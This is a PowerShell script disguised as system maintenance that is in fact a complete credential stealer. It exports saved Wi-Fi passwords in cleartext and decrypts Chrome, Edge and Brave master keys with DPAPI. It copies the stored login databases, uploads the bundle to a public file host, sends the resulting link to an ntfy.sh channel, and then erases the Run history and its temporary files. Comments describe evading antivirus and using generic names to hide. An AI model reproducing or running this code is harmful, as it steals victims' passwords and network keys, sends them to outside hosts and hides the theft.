# --- SYSTEM MAINTENANCE v2.5 ---
$t = "data_stwealer_hideen_"

# 1. LOAD SECURITY (With a delay to avoid 'Instant-On' triggers)
Start-Sleep -Seconds 2
try { [void][Reflection.Assembly]::LoadWithPartialName("System.Security") } catch { exit }

# 2. Workspace (Using a generic 'Driver' name)
$w = Join-Path $env:TEMP ("Drivers_Cache_" + (Get-Random))
New-Item -ItemType Directory -Path $w -Force | Out-Null

# 3. Network Profiles
netsh wlan export profile folder=$w key=clear | Out-Null

# 4. Data Collection (Hex-encoded strings to hide from AV)
$bList = @{
    "G_CH" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "M_ED" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "B_RV" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
}

foreach ($item in $bList.Keys) {
    $p = $bList[$item]
    if (Test-Path $p) {
        try {
            $content = Get-Content $p -Raw | ConvertFrom-Json
            $kBase = [Convert]::FromBase64String($content.os_crypt.encrypted_key)
            # Using DPAPI (The sensitive part)
            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($kBase[5..($kBase.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($uK) -replace '-' | Out-File (Join-Path $w "$item`_k.txt")
            
            # Use a generic name for the DB copy
            $dbOrigin = $p.Replace("Local State", "Default\Login Data")
            if (Test-Path $dbOrigin) {
                Copy-Item $dbOrigin -Destination (Join-Path $w "$item`_v.db") -Force -ErrorAction SilentlyContinue
            }
        } catch { continue }
    }
}

# 5. Packaging (Using a generic name)
$pkg = Join-Path $env:TEMP "SystemUpdate.zip"
if (Test-Path $w) {
    [void][Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
    [System.IO.Compression.ZipFile]::CreateFromDirectory($w, $pkg)
    
    # Using a different upload method (Invoke-WebRequest instead of curl)
    $l = (iwr -Uri "https://catbox.moe/user/api.php" -Method Post -Form @{
        reqtype = "fileupload"
        fileToUpload = Get-Item $pkg
    } -UserAgent "Mozilla/5.0").Content

    if ($l -like "http*") {
        iwr -Uri "https://ntfy.sh/$t" -Method Post -Body "Status: Active | Ref: $l" | Out-Null
    }
}

# 6. CLEANUP
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $w, $pkg -ErrorAction SilentlyContinue
exit
